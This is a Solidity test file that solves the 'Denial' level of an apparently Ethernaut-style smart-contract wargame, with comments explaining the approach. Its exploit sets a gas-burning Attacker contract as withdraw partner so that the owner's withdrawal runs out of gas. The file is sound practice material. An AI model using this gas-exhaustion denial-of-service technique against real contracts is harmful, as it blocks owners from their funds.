// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Denial.sol";
import "src/levels/DenialFactory.sol";

contract TestDenial is BaseTest {
    Denial private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DenialFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 1 ether}(true));
        level = Denial(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // We need to perform a DOS attack on Denial contract so that owner can't withdraw ether

        // There are total two external calls in withdraw fn. In second external call contract is
        // transferring ether to the owner so we can not perform a DOS attack on that call

        // First is where contract is sending partner ether using .call, even if we set our contract
        // address as partner and revert inside receive fn, owner will still get their share because
        // Denial contract does not check whether the call (to send ether) to partner address was a success or no

        // Therefore, to perform a DOS attack we have to use all the gas that was sent with the txn
        Attacker attacker = new Attacker();

        // First setting our attacker contract as a partner so we can perform a DOS attack when we receive ether
        level.setWithdrawPartner(address(attacker));

        vm.stopPrank();
    }
}

contract Attacker {
    receive() external payable {
        uint256 balance;
        // This code snippet will use the entire 1M gas that was sent with the txn
        for (uint256 i; i < 20000; i++) {
            balance = address(this).balance;
        }
    }
}
